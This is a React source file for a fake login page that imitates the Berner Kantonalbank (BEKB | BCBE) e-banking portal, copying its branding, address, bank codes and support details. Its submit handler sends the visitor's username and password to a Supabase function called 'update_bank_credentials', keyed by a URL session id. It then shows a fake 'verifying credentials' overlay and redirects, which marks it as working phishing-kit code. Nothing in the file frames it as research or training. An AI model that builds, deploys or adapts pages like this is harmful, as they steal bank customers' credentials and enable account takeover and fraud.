import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, Home, ChevronRight } from "lucide-react";
import logoAsset from "@/assets/bekb-bcbe-logo.svg.asset.json";

const RED = "#d00035";
const GREEN = "#e4ead6";
const DARK = "#545b68";
const FOOTER_BG = "#545b68";

type Lang = "DE" | "FR" | "EN";

const YoutubeIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="currentColor">
    <g fillRule="evenodd">
      <path d="M8.967 0 7.771 3.811h-.025L6.706 0H5.509l1.652 5.34v3.711h1.197V5.34L10.021 0z" />
      <path d="M10.31 4.553c0-.473.12-.746.48-.746.35 0 .469.273.469.746v3.032c0 .474-.12.745-.468.745-.361 0-.481-.271-.481-.745zm-1.131.071v3.009c0 1.1.745 1.48 1.612 1.48 1.01 0 1.6-.593 1.6-1.6V4.507c0-1.1-.746-1.48-1.613-1.48-1.01 0-1.599.592-1.599 1.598m5.075 4.488c.229 0 .433-.047.613-.154.181-.094.326-.236.434-.414h.024v.497h1.059V3.097h-1.132v4.536c0 .46-.216.626-.493.626-.348 0-.433-.224-.433-.532v-4.63h-1.13V7.94c0 .876.492 1.172 1.058 1.172m-.867 7.04c-.313 0-.517.237-.517.971v2.996c0 .438.228.628.457.628.3 0 .492-.166.492-.853v-2.936c0-.64-.18-.806-.432-.806" />
      <path d="M18.991 18.77h-2.153v1.267c0 .556.193.711.553.711.422 0 .542-.296.542-.77v-.545h1.058v.841c0 .604-.432 1.184-1.684 1.184-.854 0-1.6-.378-1.6-1.48V16.97c0-1.006.59-1.599 1.636-1.599.902 0 1.648.38 1.648 1.481zm-4.04 1.314c0 .877-.397 1.374-1.059 1.374-.457 0-.854-.213-1.07-.497h-.026v.426H11.74v-8.549h1.13v3.032h.025a.95.95 0 0 1 .432-.38c.18-.083.386-.119.566-.119.662 0 1.06.499 1.06 1.375zm-4.017 1.303h-1.06v-.497h-.023c-.108.178-.252.32-.433.414a1.17 1.17 0 0 1-.614.154c-.565 0-1.058-.296-1.058-1.173v-4.842h1.13v4.63c0 .308.085.533.433.533.278 0 .494-.167.494-.628v-4.535h1.131zm-4.152-7.555v7.555H5.58v-7.555H4.135v-.994h4.09v.994zm13.351-2.492c-.808-.68-2.09-1.027-3.81-1.027H6.94c-1.72 0-3.002.346-3.81 1.027-.797.674-1.201 1.751-1.201 3.204v5.238c0 1.451.404 2.53 1.2 3.2.8.687 2.083 1.033 3.81 1.033h9.385c1.728 0 3.01-.346 3.81-1.03.796-.675 1.2-1.752 1.2-3.203v-5.238c0-1.451-.404-2.528-1.2-3.204" />
      <path d="M17.391 16.081c-.421 0-.553.225-.553.651v1.256h1.095v-1.16c0-.534-.157-.747-.542-.747" />
    </g>
  </svg>
);

const XingIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="currentColor">
    <g fillRule="evenodd">
      <path d="m3.002 4.872 2.401 4.402L1 16.146l5.005.066 4.003-6.604-2.603-4.736zM17.212 0 9.14 14.145l5.337 9.873h5.471l-5.471-10.14L22.484 0z" />
    </g>
  </svg>
);

const ChBernerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const [lang, setLang] = useState<Lang>("DE");

  const [benutzer, setBenutzer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPwd, setShowPwd] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("BEKB | BCBE – Mein Portal", logoAsset.url);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: benutzer,
        p_password: passwort,
        p_username_label: "Benutzeridentifikation",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const langs: Lang[] = ["DE", "FR", "EN"];

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-white text-black">
        {/* Header */}
        <header className="relative">
          <div className="max-w-[1200px] mx-auto px-6 md:px-20">
            <div className="h-1.5" style={{ backgroundColor: RED }} />
            <div className="flex justify-between items-start pt-8 pb-6">
              <img src={logoAsset.url} alt="BEKB | BCBE" className="h-7 md:h-8" />
              <nav className="flex gap-6 text-[14px]">
                {langs.map((l) => (
                  <button
                    key={l}
                    onClick={() => setLang(l)}
                    style={{ color: lang === l ? "#000" : "#999" }}
                  >
                    {l}
                  </button>
                ))}
              </nav>
            </div>
          </div>
          {/* Grüne Linie full width + Dark-Block über DE */}
          <div className="relative h-[8px] w-full" style={{ backgroundColor: GREEN }}>
            <div className="max-w-[1200px] mx-auto px-6 md:px-20 h-full relative">
              <div
                className="absolute h-full"
                style={{
                  backgroundColor: DARK,
                  width: 44,
                  right: "calc(4rem + 0px)",
                  top: 0,
                }}
              />
            </div>
          </div>
        </header>

        {/* Above-the-fold Section: füllt mind. viewport, Footer erst nach Scroll */}
        <section className="min-h-screen flex flex-col">
          <div className="max-w-[1200px] w-full mx-auto px-6 md:px-20 pt-12 flex-1">
            <div
              className="inline-block pb-2 mb-10 text-[15px] font-bold"
              style={{ borderBottom: `2px solid #000000`, color: DARK }}
            >
              Mein Portal
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-[3fr_2fr] gap-12">
              {/* Login */}
              <div>
                <h1 className="text-[26px] md:text-[36px] font-bold mb-10 leading-tight">
                  Bitte geben Sie Ihre Zugangsdaten an
                </h1>

                <div className="space-y-4 max-w-[320px]">
                  <div className="relative">
                    <input
                      id="bekb-user"
                      type="text"
                      value={benutzer}
                      onChange={(e) => setBenutzer(e.target.value)}
                      placeholder="Benutzeridentifikation"
                      className="w-full bg-transparent outline-none text-[15px] text-black h-12 px-3 placeholder:text-[#545b68]"
                      style={{ borderLeft: `1px solid ${GREEN}`, borderBottom: `1px solid ${GREEN}` }}
                    />
                  </div>
                  <div className="relative">
                    <input
                      id="bekb-pass"
                      type={showPwd ? "text" : "password"}
                      value={passwort}
                      onChange={(e) => setPasswort(e.target.value)}
                      placeholder="Passwort"
                      className="w-full bg-transparent outline-none text-[15px] text-black h-12 pl-3 pr-10 placeholder:text-[#545b68]"
                      style={{ borderLeft: `1px solid ${GREEN}`, borderBottom: `1px solid ${GREEN}` }}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPwd(!showPwd)}
                      aria-label="Passwort anzeigen"
                      className="absolute right-2 top-1/2 -translate-y-1/2 text-black"
                    >
                      {showPwd ? <EyeOff size={20} /> : <Eye size={20} />}
                    </button>
                  </div>
                </div>

                <p className="text-[14px] mt-8 max-w-[640px]">
                  Mit der Anmeldung akzeptiere ich die{" "}
                  <a href="#" style={{ color: RED }}>Geschäftsbedingungen</a>{" "}
                  der BEKB | BCBE für das E-Banking.
                </p>

                <button
                  onClick={handleSubmit}
                  className="mt-6 w-full max-w-[320px] h-12 text-[15px] text-black transition-colors hover:brightness-95"
                  style={{ backgroundColor: GREEN }}
                >
                  Weiter
                </button>

                <a
                  href="#"
                  className="mt-6 inline-flex items-center gap-2 text-[14px] font-normal"
                  style={{ color: RED }}
                >
                  <ChevronRight size={14} strokeWidth={3} />
                  E-Banking Schritt für Schritt einrichten
                </a>
              </div>

              {/* Nützliche Links */}
              <aside className="p-6" style={{ backgroundColor: GREEN }}>
                <h3 className="font-bold text-[16px] mb-4">Nützliche Links</h3>
                <a href="#" className="block text-[14px] mb-4" style={{ color: RED }}>
                  Zur Support und Hilfe-Seite
                </a>
                <a href="#" className="block text-[14px]" style={{ color: RED }}>
                  So erkennen Sie Betrugsmaschen im E-Banking
                </a>

                <h3 className="font-bold text-[16px] mt-10 mb-3">Unser Support</h3>
                <p className="text-[14px] mb-4">
                  Wir rufen Sie an, wann es Ihnen am besten passt:
                </p>
                <a href="#" className="block text-[14px] mb-4" style={{ color: RED }}>
                  Telefontermin vereinbaren
                </a>
                <p className="text-[14px] mb-4">Telefon 031 666 18 80</p>
                <p className="text-[14px]">Montag bis Freitag</p>
                <p className="text-[14px] mb-3">08:00 bis 20:00 Uhr</p>
                <p className="text-[14px]">Samstag</p>
                <p className="text-[14px]">09:00 bis 16:00 Uhr</p>
              </aside>
            </div>
          </div>

          {/* Breadcrumb unten gepinnt */}
          <div className="max-w-[1200px] w-full mx-auto px-6 md:px-20 mt-12">
            <div className="py-4 flex items-center gap-3 text-[14px]">
              <div className="h-px flex-1" style={{ backgroundColor: GREEN }} />
              <Home size={16} style={{ color: GREEN }} />
              <ChevronRight size={14} style={{ color: GREEN }} />
              <span className="font-bold text-black">Mein Portal</span>
            </div>
          </div>
        </section>

        {/* Footer */}
        <footer className="text-white" style={{ backgroundColor: FOOTER_BG }}>
          <div className="max-w-[1200px] mx-auto px-6 md:px-20 py-14">
            <div className="grid grid-cols-1 md:grid-cols-4 gap-10 text-[14px]">
              <div>
                <h4 className="font-bold pb-2 mb-4 border-b border-white/40">Anschrift</h4>
                <p>BEKB | BCBE</p>
                <p>Bundesplatz 8</p>
                <p>Postfach</p>
                <p>3001 Bern</p>
              </div>
              <div>
                <h4 className="font-bold pb-2 mb-4 border-b border-white/40">Bankdaten</h4>
                <p>QR-IID: 30790</p>
                <p>BC-Nummer: 790</p>
                <p>SWIFT-Nummer: KBBECH22XXX</p>
              </div>
              <div>
                <h4 className="font-bold pb-2 mb-4 border-b border-white/40">Schnellzugriff</h4>
                <a href="#" className="block underline mb-2">Offene Stellen</a>
                <a href="#" className="block underline mb-2">Medien</a>
                <a href="#" className="block underline mb-2">Glossar</a>
                <a href="#" className="block underline">Support und Hilfe</a>
              </div>
              <div>
                <h4 className="font-bold pb-2 mb-4 border-b border-white/40">Social Media</h4>
                <div className="flex gap-3">
                  <a href="#" aria-label="YouTube" className="text-white hover:opacity-80">
                    <YoutubeIcon />
                  </a>
                  <a href="#" aria-label="Xing" className="text-white hover:opacity-80">
                    <XingIcon />
                  </a>
                </div>
              </div>
            </div>

            <div className="mt-10 flex flex-wrap items-center gap-3 text-[14px]">
              <span>© Berner Kantonalbank AG</span>
              <span className="opacity-60">|</span>
              <a href="#" className="underline">Rechtliche Hinweise</a>
              <span className="opacity-60">|</span>
              <a href="#" className="underline">Datenschutz</a>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChBernerKantonalbank;
